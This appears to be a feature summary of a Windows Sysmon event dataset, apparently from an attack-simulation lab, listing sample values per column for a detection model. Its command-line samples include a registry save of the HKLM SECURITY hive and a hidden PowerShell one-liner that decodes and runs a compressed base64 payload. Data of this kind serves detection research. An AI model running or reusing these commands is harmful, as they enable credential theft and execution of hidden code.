{b3a392b3-d1b1-4b26-b993-81e1bde1660e} edgemitmp_34f94 tmp setup exe', 'c: windows system32 userinit exe', 'c: program files (x86) event log explorer unins000 exe', 'c: program files genymobile genymotion unins000 exe', 'c: windows syswow64 mmc exe', 'c: windows system32 rundll32 exe', 'c: windows system32 disksnapshot exe', 'c: users altini~1 ste appdata local temp eu3ae5 tmp microsoftedgeupdate exe', 'c: windows system32 sppextcomobj exe'], 'ParentCommandLine': ['c: windows helppane exe -embedding', 'cmd exe  c \"reg exe save hklm security c: windows temp paahgrlzp\"', 'c: windows system32 compattelrunner exe -m:appraiser dll -f:doscheduledtelemetryrun -cv:ngsz2y4bmuu7aesl 1', 'c: windows winsxs amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10 0 17763 733_none_7e30c51b4cee0b94 tiworker exe -embedding', 'powershell exe  -nop -w hidden -noni -c \"if([intptr]::size -eq 4){$b=\\'powershell exe\\'}else{$b=$env:windir+\\' syswow64 windowspowershell v1 0 powershell exe\\'};$s=new-object system diagnostics processstartinfo;$s filename=$b;$s arguments=\\'-noni -nop -w hidden -c &([scriptblock]::create((new-object system io streamreader(new-object system io compression gzipstream((new-object system io memorystream(,[system convert]::frombase64string(\\'\\'h4siaor6qweca7vw+2 asbd+ozhyp1gvkm2vyeo4vkrktzyxkariyl6botpgxsywtzfyawjt9x+ wbdb9jretsedxwmfm7mz33w743kw+4lywnmckp+odg9cnobi0urb4 mhs7jsmpmx0g8oyke0qraulxeknkwrvynhmmazy0s7sxisi 280iqcpsmjhhklqayrfyqjbuni8d3jb+il5zns+qpszpwrs1xsa2n qzrjfady75b7whpt8vamck19 17vp8fvwexqkcms1vrvmwosvqlgvf35rmsd+9sv0dqo9roe8rmojgh8uqsm4htpsresrumhiaupulwhkoctejelsbklrxryb2sqdn2e+ygiepkmalmzstpt2ex3bzqfe5 fgkak0o4fsfjki8ma+istthacmhjp5jpq8krc43cm6yc25kuilekmsblyk2a0ltkuqp2skvzscarckehlsourcxz4kdgy11rfcxsffh2eggka3eejw6pdecexf+28jaymdqa7mqh3njendcf2tjhlsgcowoinw5iw+klg9nkxccep2uwfl39sofpig2zmnwflouq0mifgntfsbpbk8o+j2sbzgppgnsyr9qvuaa+htoam7cksfgjdcelt8w0snagjirysn5ns79suiiq+6fozzqfjka+zsserskl+rtp7vghqo+6qccdaz1wjozcefni5y7ff6xioqqrncjqwftedk+exfy9grokyguku5lsoe3w3vl+628myod5orwfupucw5sfzpe5fkvmqnai9762itzgtsjsvfg2itfvowbyrvoqdjrmdewcw1pahwjhxe0jsiqep92nxkx4r7wjfsarcu7vvmbzctc pvimpdkmg s3dgs176koocgxe+af59rgxzwviewevrmikfpqpp7+ohdipoyf5irtidkytrzcklq1pjr9zuhyqjalcdxiewtglp v9kddeghfurfa8tgpwca6xtnrewlcd30fn vbwp6ertb51fdt1m845optw4593kr9cb+tca7nesc5sf7v61ltqc98y+7tx+ecrytharf7cz6z7fd122+mzswmnpk29db9eb41ndhjsvzsxlwcb1fmiobvrzfmtjkea3t1a7dqy2+zq2r5 hnwcyyi1jlqzmi946p0+nazduahwo7nfyolbswc7rt7zfsuprhrmjqu7vkrxcnnx1dcx+m2dlsdxgojwxtc3odwiqhtzjk jpddwrf7psdcg+egpcwgexsvojbfwafijk9x4fgfzz9pq3rhmvr2qj3yyaecahohwhmrcu+yv5idteiust12e1vds4sgcgwfyhjqlh5xjmtjvd2ocdvl3jnhtzosyrvxbraowyufnepvahidwd6n03fjymkrdgaej37opc2m4zmdgw+65i7gm2vhf8nftatz4k+rgvzurw+athdgipdyc42jwbsuqobsog97o7p65u32ecwegmxwjyqrskq288qua kjad3csljad+kdlli6swxmnl8uup1jd06cfl0ksewb9dzpkqxregpdlj5alg5rqvjxitjwa4unt1zgufbhuvzaiyunycgiuwjvan1zusrykrdl8pjfnqpxmc92e+h4+kjuvthoykstoishzm2u7s7q8vautpv8 ccov8gl+gn b6evap+z+fhzmerfrd6vflvwskr8y9ghtaxie1cfg9l3w1ehzqrx4tyb8ql7n+snf8+4ycdyfl4ejw78anolgn1ekaaa=\\'\\'))),[system io compression compressionmode]::decompress))) readtoend()))\\';$s useshellexecute=$false;$s redirectstandardoutput=$true;$s windowstyle=\\'hidden\\';$s createnowindow=$true;$p=[system diagnostics process]::start($s);\"', '\"c: program files (x86) microsoft edgeupdate install {1daac6b3-5392-43ad-8306-9398233f5504} microsoftedge_x64_107 0 1418 62_107 0 1418 56 exe\" --msedge --verbose-logging --do-not-launch-msedge --system-level --channel=stable', '\"c: users altinistef stefania appdata local microsoft onedrive onedrive exe\"  background', 'c: windows system32 compattelrunner exe -m:appraiser dll -f:doscheduledtelemetryrun -cv:czchnecch0wznnlu 1', '\"c: windows softwaredistribution download install am_delta_patch_1 381 467 0 exe\" wd  q', '\"c: windows microsoft net framework v4 0 30319 ngentask exe\"  runtimewide  stopevent:528'], 'Initiated': ['0', '1'], 'SourceIsIpv6': ['0', '1'], 'DestinationIsIpv6': ['0', '1'], 'State': ['0'], 'ImageLoaded': ['C:\\\\Windows\\\\System32\\\\xmllite.dll', 'C:\\\\Windows\\\\System32\\\\advapi32.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Data\\\\f27dd71df7a6fe3f43a9e7a7c4e1870c\\\\System.Data.ni.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.CSharp\\\\9311b6c382518fe61794f144e07fef90\\\\Microsoft.CSharp.ni.dll', 'C:\\\\Windows\\\\System32\\\\dxgi.dll', 'C:\\\\Windows\\\\System32\\\\dbgcore.dll', 'C:\\\\Windows\\\\System32\\\\WindowsCodecs.dll', 'C:\\\\Windows\\\\System32\\\\ExecModelClient.dll', 'C:\\\\Windows\\\\System32\\\\deviceassociation.dll', 'C:\\\\Windows\\\\System32\\\\shacct.dll'], 'Signed': ['0', '1'], 'SignatureStatus': ['0'], 'SourceProcessId': ['6080.0', '3576.0', '3048.0', '1176.0', '436.0', '3180.0', '3248.0', '1320.0', '5920.0', '4500.0'], 'SourceThreadId': ['3576.0', '988.0', '436.0', '5516.0', '1572.0', '3460.0', '2156.0', '4772.0', '3112.0', '5896.0'], 'SourceImage': ['nan', 'c: users altini~1 ste appdata local temp rlwbevnihkajg exe', 'c: users altini~1 ste appdata local temp idrphtgujp exe', 'c: users altini~1 ste appdata local temp lfbkcqirszrl exe', 'c: windows system32 taskmgr exe', 'c: users altini~1 ste appdata local temp qozcugc exe', 'c: users altini~1 ste appdata local temp gxeipg exe', 'c: program files splunkuniversalforwarder bin splunk-admon exe', 'c: windows system32 csrss exe', 'c: windows system32 windowspowershell v1 0 powershell exe'], 'TargetImage': ['c: windows system32 wevtutil exe', 'c: program files amazon xentools liteagent exe', 'c: windows system32 audiodg exe', 'c: windows system32 rundll32 exe', 'c: windows system32 sppextcomobj exe', 'c: windows systemapps shellexperiencehost_cw5n1h2txyewy shellexperiencehost exe', 'c: windows system32 windowspowershell v1 0 powershell exe', 'c: program files splunkuniversalforwarder bin splunk-powershell exe', 'c: windows system32 cmd exe', 'c: windows system32 dmclient exe'], 'CallTrace': ['c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 wbem wmiprvsd dll+2597b|c: windows system32 wbem wmiprvsd dll+283dc|c: windows system32 wbem wmiprvsd dll+57817|c: windows system32 wbem wmiprvsd dll+8a475|c: windows system32 wbem wbemcore dll+bcb3|c: windows system32 wbem wbemcore dll+3393|c: windows system32 wbem wbemcore dll+22adf|c: windows system32 wbem wbemcore dll+22a19|c: windows system32 wbem wbemcore dll+21f5a|c: windows system32 wbem wbemcore dll+2c9be|c: windows system32 wbem wbemcore dll+202d8|c: windows system32 wbem wbemcore dll+390e|c: windows system32 wbem wbemcore dll+22bba|c: windows system32 wbem wbemcore dll+22a19|c: windows system32 wbem wbemcore dll+21f5a|c: windows system32 wbem wbemcore dll+22711|c: windows system32 wbem wbemcore dll+2d78c|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 shcore dll+64c8|c: windows system32 shcore dll+1c0e5|c: windows system32 windows storage dll+141a47|c: windows system32 windows storage dll+141373|c: windows system32 windows storage dll+1411f9|c: windows system32 windows storage dll+53731|c: windows system32 windows storage dll+53679|c: windows system32 windows storage dll+175f6|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+618a9|c: windows system32 combase dll+27a9|c: windows system32 rpcrt4 dll+62d9b|c: windows system32 combase dll+64ddc|c: windows system32 combase dll+64a92|c: windows system32 combase dll+633a8|c: windows system32 combase dll+6180f|c: windows system32 combase dll+6080f|c: windows system32 combase dll+5df06|c: windows system32 combase dll+5d6ba|c: windows system32 user32 dll+121e4|c: windows system32 user32 dll+11b2c', 'c: windows system32 ntdll dll+a7404|c: windows system32 kernelbase dll+2b860|c: windows system32 kernelbase dll+6f453|c: windows system32 kernel32 dll+1d37f|c: windows system32 rpcss dll+35af2|c: windows system32 rpcss dll+3c90d|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+22b4b|c: windows system32 rpcrt4 dll+653fa|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+221bd|c: windows system32 shcore dll+64c8|c: windows system32 shcore dll+1c0e5|c: windows system32 windows storage dll+1419b2|c: windows system32 windows storage dll+141373|c: windows system32 windows storage dll+1411f9|c: windows system32 windows storage dll+53731|c: windows system32 windows storage dll+53679|c: windows system32 windows storage dll+175f6|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+618a9|c: windows system32 combase dll+27a9|c: windows system32 rpcrt4 dll+62d9b|c: windows system32 combase dll+64ddc|c: windows system32 combase dll+64a92|c: windows system32 combase dll+633a8|c: windows system32 combase dll+6180f|c: windows system32 combase dll+6080f|c: windows system32 combase dll+5df06|c: windows system32 combase dll+5d6ba|c: windows system32 user32 dll+121e4|c: windows system32 user32 dll+11b2c', 'c: windows system32 ntdll dll+a6134|c: windows system32 basesrv dll+2f47|c: windows system32 csrsrv dll+5645|c: windows system32 ntdll dll+5178f', 'c: windows system32 ntdll dll+a6134|c: windows system32 psmserviceexthost dll+966a|c: windows system32 psmserviceexthost dll+776e|c: windows system32 psmserviceexthost dll+489d|c: windows system32 psmserviceexthost dll+1a2ed|c: windows system32 psmserviceexthost dll+11055|c: windows system32 psmserviceexthost dll+108cf|c: windows system32 ntdll dll+2063e|c: windows system32 ntdll dll+1e854|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a5ec4|c: windows system32 basesrv dll+2f47|c: windows system32 csrsrv dll+5645|c: windows system32 ntdll dll+6e87f', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+5eab4|c: windows system32 lsm dll+1f3a|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+62d4c|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6134|c: windows system32 kernelbase dll+5eab4|c: windows system32 lsm dll+e9d6|c: windows system32 lsm dll+1439d|c: windows system32 rpcrt4 dll+7a593|c: windows system32 rpcrt4 dll+d9f41|c: windows system32 rpcrt4 dll+62d4c|c: windows system32 rpcrt4 dll+4a274|c: windows system32 rpcrt4 dll+4918d|c: windows system32 rpcrt4 dll+49a3b|c: windows system32 rpcrt4 dll+310ac|c: windows system32 rpcrt4 dll+3152c|c: windows system32 rpcrt4 dll+1ae1c|c: windows system32 rpcrt4 dll+1c67b|c: windows system32 rpcrt4 dll+43a2a|c: windows system32 ntdll dll+1d34e|c: windows system32 ntdll dll+1ecb9|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781', 'c: windows system32 ntdll dll+a6cc4|c: windows system32 fntcache dll+17acf|c: windows system32 fntcache dll+1a697|c: windows system32 fntcache dll+1aacc|c: windows system32 fntcache dll+5034e|c: windows system32 fntcache dll+50052|c: windows system32 kernel32 dll+84d4|c: windows system32 ntdll dll+51781'], 'SourceUser': ['nan', '0', 'stefania altinitat', 'nt authority system', '0 0', 'attackrange reed_schmidt', 'attackrange administrator', 'stefania altinistef', 'nt authority network service'], 'TargetUser': ['nan', '0', 'stefania altinitat', 'nt authority system', '0 0', 'window manager dwm-2', 'window manager dwm-1', 'nt authority local service', 'attackrange reed_schmidt', 'attackrange administrator'], 'TargetFilename': ['c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe system linq parallel dll', 'c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe pt-br windowsbase resources dll', 'c: users altinitat stefania appdata local microsoft onedrive 22 227 1030 0001 updateringsettings dll', 'c: windows assembly nativeimages_v4 0 30319_64 temp 17a0-0 microsoft powershell diagnostics activities dll', 'c: users altini~1 ste appdata local temp euf936 tmp msedgeupdateres_am dll', 'c: users altinitat stefania appdata local microsoft onedrive 22 227 1030 0001 libegl dll', 'c: program files windowsapps microsoft yourphone_1 22102 229 0_x64__8wekyb3d8bbwe system web httputility dll', 'c: windows assembly nativeimages_v4 0 30319_64 temp 19c4-0 system windows forms dll', 'c: program files (x86) microsoft office office12 excel exe', 'c: program files windowsapps microsoft yourphone_1 22112 142 0_x64__8wekyb3d8bbwe zh-hant system windows forms design resources dll'], 'CreationUtcTime': ['0.7036285277352982', '0.9951341582093702', '0.6623383845405255', '0.426803837063812', '0.9788127346030864', '0.2235228694564159', '0.0126511886556374', '0.8279160294730988', '0.3954678159321562', '0.0987904907549006'], 'TargetObject': ['registry a {0fc8a9bb-e838-87c3-41d9-f3d55391d81b} root inventoryapplicationfile msedge_pwa_launc|c9480937f96172bb binproductversion', 'registry a {0c206a16-415a-53ce-9ef9-60067705eced} root inventoryapplicationfile microsoft msn we|f2cafba57482fb1a linkdate', 'registry a {fe472076-0dcd-896c-3a9a-5b98ce14f905} root inventoryapplicationfile setup exe|4a41fceabf85d9fd binproductversion', 'registry a {09e83960-58de-ea93-2257-7c2a713e7f37} root inventoryapplicationfile onedrivesetup ex|c24f0c323a0223b3 lowercaselongpath', 'registry a {0fc8a9bb-e838-87c3-41d9-f3d55391d81b} root inventoryapplicationfile microsoft msn we|d47a1e63f730c31b binproductversion', 'registry a {e7865ed6-e84c-88db-f1fd-3be150d460fc} root inventoryapplicationfile dwm exe|f848a80c6540ffad lowercaselongpath', 'registry a {09e83960-58de-ea93-2257-7c2a713e7f37} root inventoryapplicationfile microsoft sharep|640369cf72a079e2 linkdate', 'hkcr access shortcut macro 1 shell design ddeexec topic (default)', 'hklm system currentcontrolset services consentuxusersvc_840f8 imagepath', 'registry a {08a1771e-c527-f9f9-3563-6f12a534a3a7} root inventoryapplicationfile mmc exe|8471611706ce450b lowercaselongpath'], 'Details': ['03 25 2020 03:06:23', 'c: windows system32 svchost exe -k devicesflow', '10 0 19041 2006', 'c: program files windowsapps microsoft people_10 1902 633 0_x64__8wekyb3d8bbwe peopleapp exe', 'c: progra~2 micros~2 office12 groove exe  grv: \"%%1\"', 'c: program files (x86) microsoft edgewebview application 108 0 1462 76 installer setup exe', 'c: users altinitat stefania appdata local microsoft edgeupdate 1 3 171 39 psuser dll', '07 18 2009 19:34:52', '12 21 2002 20:58:22', 'c: users altinistef stefania appdata local microsoft onedrive 22 232 1106 0002 i386 filecoauthlib dll'], 'PipeName': ['nan', 'tsvcpipe-f3aae42b-6d29-4106-9be1-1abd921ef3a6', 'psexesvc-win-host-987-3456-stdout', '0', '<anonymous pipe>', '0 0', 'pshost 132815753754614208 344 defaultappdomain wsmprovhost', 'winsock2 catalogchangelistener-804-0', 'lsass', 'srvsvc'], 'QueryStatus': ['nan', '9003.0', '9852.0', '9002.0', '9701.0', '9501.0', '1223.0', '0.0', '1460.0'], 'IsExecutable': ['0', '1'], 'StartFunction': ['nan', 'CtrlRoutine', '0', '0.0', '-'], 'PreviousCreationUtcTime': ['0.8529126376016329', '0.7895923025802536', '0.7456623560255694', '0.7972362565664', '0.850179062953207', '0.7633274581756191', '0.8722585609849943', '0.7782283126646345', '0.9126534877645216', '0.7428300825761389'], 'ID': ['0.0', 'nan', '0', 'GetConfigurationOptions'], 'Label': ['0', '1', '2'], 'binary_Level_0': ['0', '1'], 'binary_Level_1': ['0'], 'binary_Level_2': ['0', '1'], 'binary_Level_3': ['0', '1'], 'binary_Level_4': ['0', '1'], 'binary_Level_5': ['0', '1'], 'binary_Level_6': ['0', '1'], 'binary_Level_7': ['0', '1'], 'binary_Task_0': ['0', '1'], 'binary_Task_1': ['0', '1'], 'binary_Task_2': ['0', '1'], 'binary_Task_3': ['0', '1'], 'binary_Task_4': ['0', '1'], 'binary_Task_5': ['0', '1'], 'binary_Task_6': ['0', '1'], 'binary_Task_7': ['0', '1'], 'binary_Protocol_0': ['0'], 'binary_Protocol_1': ['0', '1'], 'binary_Protocol_2': ['0', '1'], 'binary_Protocol_3': ['0', '1'], 'binary_Protocol_4': ['0', '1'], 'binary_Protocol_5': ['0', '1'], 'binary_Protocol_6': ['0', '1'], 'binary_Protocol_7': ['1'], 'binary_Version2_0': ['0', '1'], 'binary_Version2_1': ['0', '1'], 'binary_Version2_2': ['0', '1'], 'binary_Version2_3': ['1'], 'binary_Version2_4': ['0', '1'], 'binary_Version2_5': ['0', '1'], 'binary_Version2_6': ['0', '1'], 'binary_Version2_7': ['1'], 'binary_SchemaVersion_0': ['0', '1'], 'binary_SchemaVersion_1': ['0', '1'], 'binary_SchemaVersion_2': ['0', '1'], 'binary_SchemaVersion_3': ['0', '1'], 'binary_SchemaVersion_4': ['0', '1'], 'binary_SchemaVersion_5': ['0', '1'], 'binary_SchemaVersion_6': ['0', '1'], 'binary_SchemaVersion_7': ['0', '1'], 'binary_Signature_0': ['0', '1'], 'binary_Signature_1': ['0', '1'], 'binary_Signature_2': ['0', '1'], 'binary_Signature_3': ['0', '1'], 'binary_Signature_4': ['0', '1'], 'binary_Signature_5': ['0', '1'], 'binary_Signature_6': ['0', '1'], 'binary_Signature_7': ['0', '1'], 'binary_EventType_0': ['0', '1'], 'binary_EventType_1': ['0', '1'], 'binary_EventType_2': ['0', '1'], 'binary_EventType_3': ['0', '1'], 'binary_EventType_4': ['0', '1'], 'binary_EventType_5': ['0', '1'], 'binary_EventType_6': ['0', '1'], 'binary_EventType_7': ['0', '1'], 'binary_Configuration_0': ['0', '1'], 'binary_Configuration_1': ['0', '1'], 'binary_Configuration_2': ['0', '1'], 'binary_Configuration_3': ['0', '1'], 'binary_Configuration_4': ['0', '1'], 'binary_Configuration_5': ['0', '1'], 'binary_Configuration_6': ['0', '1'], 'binary_Configuration_7': ['0', '1'], 'binary_ConfigurationFileHash_0': ['0', '1'], 'binary_ConfigurationFileHash_1': ['0', '1'], 'binary_ConfigurationFileHash_2': ['0', '1'], 'binary_ConfigurationFileHash_3': ['0', '1'], 'binary_ConfigurationFileHash_4': ['0', '1'], 'binary_ConfigurationFileHash_5': ['0', '1'], 'binary_ConfigurationFileHash_6': ['0', '1'], 'binary_ConfigurationFileHash_7': ['0', '1'], 'binary_IntegrityLevel_0': ['0', '1'], 'binary_IntegrityLevel_1': ['0', '1'], 'binary_IntegrityLevel_2': ['0', '1'], 'binary_IntegrityLevel_3': ['0', '1'], 'binary_IntegrityLevel_4': ['0', '1'], 'binary_IntegrityLevel_5': ['0', '1'], 'binary_IntegrityLevel_6': ['0', '1'], 'binary_IntegrityLevel_7': ['0', '1'], 'binary_UserID_0': ['1'], 'binary_UserID_1': ['0'], 'binary_UserID_2': ['0', '1'], 'binary_UserID_3': ['0', '1'], 'binary_UserID_4': ['0', '1'], 'binary_UserID_5': ['0', '1'], 'binary_UserID_6': ['0', '1'], 'binary_UserID_7': ['0', '1'], 'binary_Computer_0': ['0', '1'], 'binary_Computer_1': ['0', '1'], 'binary_Computer_2': ['0', '1'], 'binary_Computer_3': ['0', '1'], 'binary_Computer_4': ['0', '1'], 'binary_Computer_5': ['0', '1'], 'binary_Computer_6': ['0', '1'], 'binary_Computer_7': ['0', '1'], 'binary_RuleName_0': ['0', '1'], 'binary_RuleName_1': ['0', '1'], 'binary_RuleName_2': ['0', '1'], 'binary_RuleName_3': ['0', '1'], 'binary_RuleName_4': ['0', '1'], 'binary_RuleName_5': ['0', '1'], 'binary_RuleName_6': ['0', '1'], 'binary_RuleName_7': ['0', '1'], 'binary_TerminalSessionId_0': ['0', '1'], 'binary_TerminalSessionId_1': ['0', '1'], 'binary_TerminalSessionId_2': ['0', '1'], 'binary_TerminalSessionId_3': ['0', '1'], 'binary_TerminalSessionId_4': ['0', '1'], 'binary_TerminalSessionId_5': ['0', '1'], 'binary_TerminalSessionId_6': ['0', '1'], 'binary_TerminalSessionId_7': ['0', '1'], 'binary_Version_0': ['0', '1'], 'binary_Version_1': ['0', '1'], 'binary_Version_2': ['0', '1'], 'binary_Version_3': ['0', '1'], 'binary_Version_4': ['0', '1'], 'binary_Version_5': ['0', '1'], 'binary_Version_6': ['0', '1'], 'binary_Version_7': ['0', '1'], 'binary_User_0': ['0', '1'], 'binary_User_1': ['0', '1'], 'binary_User_2': ['0', '1'], 'binary_User_3': ['0', '1'], 'binary_User_4': ['0', '1'], 'binary_User_5': ['0', '1'], 'binary_User_6': ['0', '1'], 'binary_User_7': ['0', '1'], 'binary_ParentUser_0': ['0', '1'], 'binary_ParentUser_1': ['0', '1'], 'binary_ParentUser_2': ['0', '1'], 'binary_ParentUser_3': ['0', '1'], 'binary_ParentUser_4': ['0', '1'], 'binary_ParentUser_5': ['0', '1'], 'binary_ParentUser_6': ['0', '1'], 'binary_ParentUser_7': ['0', '1'], 'binary_Guid_0': ['0', 'nan'], 'binary_Guid_1': ['0', 'nan', '1'], 'binary_Guid_2': ['nan', '1'], 'binary_Guid_3': ['nan', '1'], 'binary_Guid_4': ['0', 'nan', '1'], 'binary_Guid_5': ['nan', '0', '1'], 'binary_Guid_6': ['nan', '1'], 'binary_Guid_7': ['0', 'nan'], 'binary_Guid_8': ['0', 'nan'], 'binary_Guid_9': ['0', 'nan', '1'], 'binary_Guid_10': ['0', 'nan', '1'], 'binary_Guid_11': ['nan', '0', '1'], 'binary_Guid_12': ['nan', '0', '1'], 'binary_Guid_13': ['0', 'nan', '1'], 'binary_Guid_14': ['nan', '0', '1'], 'binary_Guid_15': ['nan', '0', '1'], 'binary_ProcessGuid_0': ['0', 'nan', '1'], 'binary_ProcessGuid_1': ['0', 'nan', '1'], 'binary_ProcessGuid_2': ['0', 'nan', '1'], 'binary_ProcessGuid_3': ['0', 'nan', '1'], 'binary_ProcessGuid_4': ['0', 'nan', '1'], 'binary_ProcessGuid_5': ['0', 'nan', '1'], 'binary_ProcessGuid_6': ['0', 'nan', '1'], 'binary_ProcessGuid_7': ['0', 'nan', '1'], 'binary_ProcessGuid_8': ['0', 'nan', '1'], 'binary_ProcessGuid_9': ['0', 'nan', '1'], 'binary_ProcessGuid_10': ['0', 'nan', '1'], 'binary_ProcessGuid_11': ['0', 'nan', '1'], 'binary_ProcessGuid_12': ['0', 'nan', '1'], 'binary_ProcessGuid_13': ['0', 'nan', '1'], 'binary_ProcessGuid_14': ['0', 'nan', '1'], 'binary_ProcessGuid_15': ['0', 'nan', '1'], 'binary_ParentProcessGuid_0': ['0', 'nan', '1'], 'binary_ParentProcessGuid_1': ['0', 'nan', '1'], 'binary_ParentProcessGuid_2': ['0', 'nan', '1'], 'binary_ParentProcessGuid_3': ['0', 'nan', '1'], 'binary_ParentProcessGuid_4': ['0', 'nan', '1'], 'binary_ParentProcessGuid_5': ['0', 'nan', '1'], 'binary_ParentProcessGuid_6': ['0', 'nan', '1'], 'binary_ParentProcessGuid_7': ['0', 'nan', '1'], 'binary_ParentProcessGuid_8': ['0', 'nan', '1'], 'binary_ParentProcessGuid_9': ['0', 'nan', '1'], 'binary_ParentProcessGuid_10': ['0', 'nan', '1'], 'binary_ParentProcessGuid_11': ['0', 'nan', '1'], 'binary_ParentProcessGuid_12': ['0', 'nan', '1'], 'binary_ParentProcessGuid_13': ['0', 'nan', '1'], 'binary_ParentProcessGuid_14': ['0', 'nan', '1'], 'binary_ParentProcessGuid_15': ['0', 'nan', '1'], 'binary_SourceProcessGUID_0': ['nan', '0', '1'], 'binary_SourceProcessGUID_1': ['nan', '0', '1'], 'binary_SourceProcessGUID_2': ['nan', '0', '1'], 'binary_SourceProcessGUID_3': ['0', 'nan', '1'], 'binary_SourceProcessGUID_4': ['nan', '0', '1'], 'binary_SourceProcessGUID_5': ['nan', '0', '1'], 'binary_SourceProcessGUID_6': ['0', 'nan', '1'], 'binary_SourceProcessGUID_7': ['nan', '0', '1'], 'binary_SourceProcessGUID_8': ['0', 'nan', '1'], 'binary_SourceProcessGUID_9': ['nan', '0', '1'], 'binary_SourceProcessGUID_10': ['nan', '0', '1'], 'binary_SourceProcessGUID_11': ['nan', '0', '1'], 'binary_SourceProcessGUID_12': ['nan', '0', '1'], 'binary_SourceProcessGUID_13': ['0', 'nan', '1'], 'binary_SourceProcessGUID_14': ['nan', '0', '1'], 'binary_SourceProcessGUID_15': ['0', 'nan', '1'], 'binary_TargetProcessGUID_0': ['nan', '0', '1'], 'binary_TargetProcessGUID_1': ['nan', '0', '1'], 'binary_TargetProcessGUID_2': ['nan', '0', '1'], 'binary_TargetProcessGUID_3': ['0', 'nan', '1'], 'binary_TargetProcessGUID_4': ['nan', '0', '1'], 'binary_TargetProcessGUID_5': ['nan', '0', '1'], 'binary_TargetProcessGUID_6': ['0', 'nan', '1'], 'binary_TargetProcessGUID_7': ['nan', '0', '1'], 'binary_TargetProcessGUID_8': ['0', 'nan', '1'], 'binary_TargetProcessGUID_9': ['nan', '0', '1'], 'binary_TargetProcessGUID_10': ['nan', '0', '1'], 'binary_TargetProcessGUID_11': ['nan', '0', '1'], 'binary_TargetProcessGUID_12': ['nan', '0', '1'], 'binary_TargetProcessGUID_13': ['0', 'nan', '1'], 'binary_TargetProcessGUID_14': ['nan', '0', '1'], 'binary_TargetProcessGUID_15': ['0', 'nan', '1'], 'binary_SourceProcessGuid_0': ['0', 'nan', '1'], 'binary_SourceProcessGuid_1': ['0', 'nan', '1'], 'binary_SourceProcessGuid_2': ['0', 'nan', '1'], 'binary_SourceProcessGuid_3': ['0', 'nan', '1'], 'binary_SourceProcessGuid_4': ['0', 'nan', '1'], 'binary_SourceProcessGuid_5': ['0', 'nan', '1'], 'binary_SourceProcessGuid_6': ['0', 'nan', '1'], 'binary_SourceProcessGuid_7': ['0', 'nan', '1'], 'binary_SourceProcessGuid_8': ['0', 'nan', '1'], 'binary_SourceProcessGuid_9': ['0', 'nan', '1'], 'binary_SourceProcessGuid_10': ['0', 'nan', '1'], 'binary_SourceProcessGuid_11': ['0', 'nan', '1'], 'binary_SourceProcessGuid_12': ['0', 'nan', '1'], 'binary_SourceProcessGuid_13': ['0', 'nan', '1'], 'binary_SourceProcessGuid_14': ['0', 'nan', '1'], 'binary_SourceProcessGuid_15': ['0', 'nan', '1'], 'binary_LogonGuid_0': ['0', 'nan', '1'], 'binary_LogonGuid_1': ['0', 'nan', '1'], 'binary_LogonGuid_2': ['0', 'nan', '1'], 'binary_LogonGuid_3': ['0', 'nan', '1'], 'binary_LogonGuid_4': ['0', 'nan', '1'], 'binary_LogonGuid_5': ['0', 'nan', '1'], 'binary_LogonGuid_6': ['0', 'nan', '1'], 'binary_LogonGuid_7': ['0', 'nan', '1'], 'binary_LogonGuid_8': ['0', 'nan', '1'], 'binary_LogonGuid_9': ['0', 'nan', '1'], 'binary_LogonGuid_10': ['0', 'nan', '1'], 'binary_LogonGuid_11': ['0', 'nan', '1'], 'binary_LogonGuid_12': ['0', 'nan', '1'], 'binary_LogonGuid_13': ['0', 'nan', '1'], 'binary_LogonGuid_14': ['0', 'nan', '1'], 'binary_LogonGuid_15': ['0', 'nan', '1'], 'binary_ThreadID_0': ['0', 'nan', '1'], 'binary_ThreadID_1': ['0', 'nan', '1'], 'binary_ThreadID_2': ['0', 'nan', '1'], 'binary_ThreadID_3': ['0', 'nan', '1'], 'binary_ThreadID_4': ['0', 'nan', '1'], 'binary_ThreadID_5': ['0', 'nan', '1'], 'binary_ThreadID_6': ['0', 'nan', '1'], 'binary_ThreadID_7': ['0', 'nan', '1'], 'binary_ThreadID_8': ['0', 'nan', '1'], 'binary_ThreadID_9': ['0', 'nan', '1'], 'binary_ThreadID_10': ['0', 'nan', '1'], 'binary_ThreadID_11': ['0', 'nan', '1'], 'binary_ThreadID_12': ['0', 'nan', '1'], 'binary_ThreadID_13': ['0', 'nan', '1'], 